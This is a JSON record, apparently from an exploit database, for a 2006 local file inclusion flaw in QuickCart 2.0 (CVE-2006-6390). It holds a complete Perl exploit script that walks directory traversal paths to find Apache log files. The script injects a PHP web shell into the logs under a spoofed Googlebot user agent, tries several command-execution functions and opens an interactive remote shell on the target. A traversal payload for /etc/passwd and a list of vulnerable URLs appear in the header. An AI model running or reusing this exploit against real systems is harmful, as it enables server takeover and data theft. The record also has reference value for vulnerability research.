{
  "id": "2889",
  "title": "QuickCart 2.0 - &#039;categories.php&#039; Local File Inclusion",
  "cve": "CVE-2006-6390",
  "vuln_type": "path_traversal",
  "code": "#################################################################################################\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                  writ3r [at] gmail.com                                        #\r\n#                                                                                               #\r\n#                        QuickCart 2.0 Local File Inclusion Exploit                             #\r\n#################################################################################################\r\n# Software: QuickCart 2.0                                                                       #\r\n#                                                                                               #\r\n# Vendor: http://opensolution.org/                                                              #\r\n#                                                                                               #\r\n# Released: 2006/12/03                                                                          #\r\n#                                                                                               #\r\n# Critical: Moderately crtical                                                                  #\r\n#                                                                                               #\r\n# Discovered & Exploit By: r0ut3r (writ3r [at] gmail.com)                                       #\r\n#                                                                                               #\r\n# Note: The information provided in this document is for Quick Cart administrator               #\r\n# testing purposes only!                                                                        #\r\n#                                                                                               #\r\n# register_globals must be on                                                                   #\r\n# gpc_magic_quotes must be off                                                                  #\r\n#                                                                                               #\r\n# actions_admin/categories.php?config[db_type]=                                                 #\r\n# actions_admin/couriers.php?config[db_type]=                                                   #\r\n# actions_admin/orders.php?config[db_type]=                                                     #\r\n# actions_admin/products.php?config[db_type]=                                                   #\r\n# actions_client/products.php?config[db_type]=                                                  #\r\n# actions_client/orders.php?config[db_type]=                                                    #\r\n#                                                                                               #\r\n# Vulnerable code:                                                                              #\r\n# require_once DIR_CORE.'couriers-'.$config['db_type'].'.php';                                  #\r\n#                                                                                               #\r\n# Patch: (Place this code at the top of every file)                                             #\r\n# if(basename(__FILE__) == basename($_SERVER['PHP_SELF']))                                      #\r\n#    die();                                                                                     #\r\n#                                                                                               #\r\n# Exploit: categories.php?config[db_type]=../../../../../../../../../../../etc/passwd%00        #\r\n# Usage: perl localfilexpl.pl 127.0.0.1  actions_admin/categories.php?config[db_type]=          #\r\n#################################################################################################\r\n\r\n############################################################################\r\n#                   Local File Inclusion Exploiter                         #\r\n#                                                                          #\r\n# This script attempts to exploit a local file include vulnerability       #\r\n# by finding a readable http log file, then by sending a specially crafted #\r\n# http request to the server in order to insert a PHP Shell into the       #\r\n# log files. A shell is then spawned.                                      #\r\n#                                                                          #\r\n# Created By r0ut3r (writ3r [at] gmail.com)                                #\r\n############################################################################\r\n\r\nuse IO::Socket;\r\nuse Switch;\r\n\r\n$port = \"80\"; # connection port\r\n$target = @ARGV[0]; # localhost\r\n$vulnf = @ARGV[1]; # /include/WBmap.php?l=\r\n$opt = @ARGV[2]; # -p (not needed)\r\n\r\nsub Header()\r\n{\r\n        print q {Local File Inclusion Exploiter - By r0ut3r (writ3r [at]\r\ngmail.com)\r\n-------------------------------------------------------------------\r\n};\r\n}\r\n\r\nsub Usage()\r\n{\r\n        print q {Usage: localfilexpl.pl [target] [folder & vulnerable file]\r\n[opt]\r\nExample: localfilexpl.pl localhost /include/WBmap.php?l= -p\r\nopt = -p (To print recieved content)\r\n};\r\n        exit();\r\n}\r\n\r\nHeader();\r\n\r\nif (!$target || !$vulnf) {\r\n        Usage(); }\r\n\r\n@targets = (\r\n\"var/log/httpd/access_log\",\r\n\"var/log/httpd/error_log\",\r\n\"var/log/access_log\",\r\n\"var/log/error_log\",\r\n\"var/www/logs/access.log\",\r\n\"var/www/logs/access_log\",\r\n\"var/www/logs/error_log\",\r\n\"var/www/logs/error.log\",\r\n\"apache/logs/access_log\",\r\n\"apache/logs/error.log\",\r\n\"etc/httpd/logs/access.log\",\r\n\"etc/httpd/logs/access_log\",\r\n\"etc/httpd/logs/error.log\",\r\n\"etc/httpd/logs/error_log\",\r\n\"usr/local/apache/logs/access.log\",\r\n\"usr/local/apache/logs/access_log\",\r\n\"usr/local/apache/logs/error.log\",\r\n\"usr/local/apache/logs/error_log\",\r\n\"var/log/apache2/error_log\",\r\n\"var/log/apache2/error.log\",\r\n\"var/log/apache2/access_log\",\r\n\"var/log/apache2/access.log\",\r\n\"access_log\",\r\n);\r\n\r\n@paths = ();\r\n$dirs = 5;\r\n$count = 0;\r\n\r\nforeach $target (@targets)\r\n{\r\n        for(0..$dirs){\r\n                $paths[$count+$_] = \"../\"x$_ . $target;\r\n        }\r\n        $count += $dirs;\r\n}\r\n\r\nprint \"[+] Attempting to locate log file\\n\";\r\n$log = \"\";\r\nforeach $path (@paths)\r\n{\r\n#print \"$path\\n\";\r\n        $sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target,\r\nPeerPort => $port) || die \"[-] Failed to connect. Exiting...\\r\\n\";\r\n        print $sock \"GET \".$vulnf.$path.\"%00 HTTP/1.1\\n\";\r\n        print $sock \"Host: $target\\n\";\r\n        print $sock \"User-Agent: Googlebot/2.1\r\n(+http://www.google.com/bot.html)\\n\";\r\n        print $sock \"Accept: text/html\\n\";\r\n        print $sock \"Connection: close\\n\\n\\r\\n\";\r\n\r\n        while (<$sock>)\r\n        {\r\n                if (/<title>404 Not Found/)\r\n                {\r\n                        print \"[-] Vulnerable file not found! Exiting... \\n\";\r\n                        exit();\r\n                }\r\n\r\n                if (/Permission denied/) {\r\n                        print \"[-] Log file found, but permission was denied\r\nto read file. [\".$path.\"] \\n\"; }\r\n\r\n                if (/(.*?).(.*?).(.*?).(.*?) - - \\[(.*?)/)\r\n                {\r\n                        if ($path ne $log) {\r\n                                print \"[+] Log file found! [\".$path.\"] \\n\"; }\r\n                        $log = $path;\r\n                }\r\n        }\r\n}\r\n\r\nif ($log eq \"\") {\r\nprint \"[-] Log file not found. Exiting...\\n\"; exit(); }\r\n\r\n$cmdfunct = \"system\";\r\nprint \"[+] Inserting PHP Shell into logs\\n\";\r\n$code = \"<?php ob_clean(); echo 'r0ut3r - Local File Include Expoiter '; echo\r\n\".$cmdfunct.\"(\\$_GET['cmd']); die(); ?>\";\r\n$xpl = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort =>\r\n$port) || die \"[-] Failed to connect. Exiting...\\r\\n\";\r\nprint $xpl \"GET /\".$code.\" HTTP/1.1\\n\";\r\nprint $xpl \"Host: $target\\n\";\r\nprint $xpl \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\nprint $xpl \"Accept: text/html\\n\";\r\nprint $xpl \"Connection: close\\n\\n\\r\\n\";\r\n\r\n@cmdfunctions = (\"exec\", \"shell_exec\", \"passthru\");\r\n$enabled_funct = false;\r\n\r\n$xpl_test = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target,\r\nPeerPort => $port) || die \"[-] Failed to connect. Exiting...\\r\\n\";\r\nprint $xpl_test \"GET \".$vulnf.$path.$log.\"%00&cmd=dir HTTP/1.1\\n\";\r\nprint $xpl_test \"Host: $target\\n\";\r\nprint $xpl_test \"User-Agent: Googlebot/2.1\r\n(+http://www.google.com/bot.html)\\n\";\r\nprint $xpl_test \"Accept: text/html\\n\";\r\nprint $xpl_test \"Connection: close\\n\\n\\r\\n\";\r\n\r\nwhile (<$xpl_test>)\r\n{\r\n        if (/system\\(\\) has been disabled for security/)\r\n        {\r\n                print \"[-] system() function is disabled. \\n\";\r\n                foreach $cmdfunct (@cmdfunctions)\r\n                {\r\n                        if ($enabled_funct eq false)\r\n                        {\r\n                                print \"[+] Trying \".$cmdfunct.\"()\\n\";\r\n                                $code = \"<?php ob_clean(); echo 'r0ut3r - Local File Include Expoiter '; echo \".$cmdfunct.\"(\\$_GET['cmd']); die(); ?>\";\r\n                                $xpl = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect.\r\nExiting...\\r\\n\";\r\n                                print $xpl \"GET /\".$code.\" HTTP/1.1\\n\";\r\n                                print $xpl \"Host: $target\\n\";\r\n                                print $xpl \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\n                                print $xpl \"Accept: text/html\\n\";\r\n                                print $xpl \"Connection: close\\n\\n\\r\\n\";\r\n\r\n                                $xpl_retry = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target, PeerPort => $port) || die \"[-] Failed to connect.\r\nExiting...\\r\\n\";\r\n                                print $xpl_retry \"GET \".$vulnf.$path.$log.\"%00&cmd=dir HTTP/1.1\\n\";\r\n                                print $xpl_retry \"Host: $target\\n\";\r\n                                print $xpl_retry \"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\n\";\r\n                                print $xpl_retry \"Accept: text/html\\n\";\r\n                                print $xpl_retry \"Connection: close\\n\\n\\r\\n\";\r\n\r\n                                while (<$xpl_retry>)\r\n                                {\r\n                                        if (/b>:  $cmdfunct\\(\\) has been disabled for security reasons/)\r\n                                        {\r\n                                                print \"[-] \".$cmdfunct.\"() function is disabled. \\n\";\r\n                                                $enabled_funct = false;\r\n                                                last;\r\n                                        }\r\n                                        else\r\n                                        {\r\n                                                $enabled_funct = true;\r\n                                        }\r\n                                }\r\n\r\n                                if ($enabled_funct eq true)\r\n                                {\r\n                                        print \"[+] Enabled function found! [\".$cmdfunct.\"]\\n\";\r\n                                        break;\r\n                                }\r\n                        }\r\n                }\r\n\r\n                if ($enabled_funct eq false) {\r\n                print \"[-] No enabled cmd function found. Tried system(),\r\nexec(), shell_exec(), passthru()\\n\"; exit(); }\r\n        }\r\n}\r\n\r\nprint \"[!] Command execution at: http://\".$target.$vulnf.$log.\"%00\\n\";\r\nprint \"[+] Creating shell - Type 'exit' to quit\\n\";\r\n\r\nprint \"[cmd]\\$ \";\r\n$cmd = <STDIN>;\r\n$cmd =~ s/ /%20/g;\r\n\r\nwhile ($cmd !~ \"exit\")\r\n{\r\n        $scmd = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $target,\r\nPeerPort => $port) || die \"[-] Failed to connect. Exiting...\\r\\n\";\r\n        print $scmd \"GET \".$vulnf.$path.$log.\"%00&cmd=\".substr($cmd, 0, -1).\"\r\nHTTP/1.1\\n\";\r\n        print $scmd \"Host: $target\\n\";\r\n        print $scmd \"User-Agent: Googlebot/2.1\r\n(+http://www.google.com/bot.html)\\n\";\r\n        print $scmd \"Accept: text/html\\n\";\r\n        print $scmd \"Connection: close\\n\\n\\r\\n\";\r\n\r\n        # prints output from command execution\r\n        if ($opt eq \"-p\")\r\n        {\r\n                while (<$scmd>)\r\n                {\r\n                        print <$scmd>;\r\n                }\r\n        }\r\n\r\n        print \"[cmd]\\$ \";\r\n        $cmd = <STDIN>;\r\n        $cmd =~ s/ /%20/g;\r\n}\r\n\r\n# milw0rm.com [2006-12-03]",
  "url": "https://www.exploit-db.com/exploits/2889"
}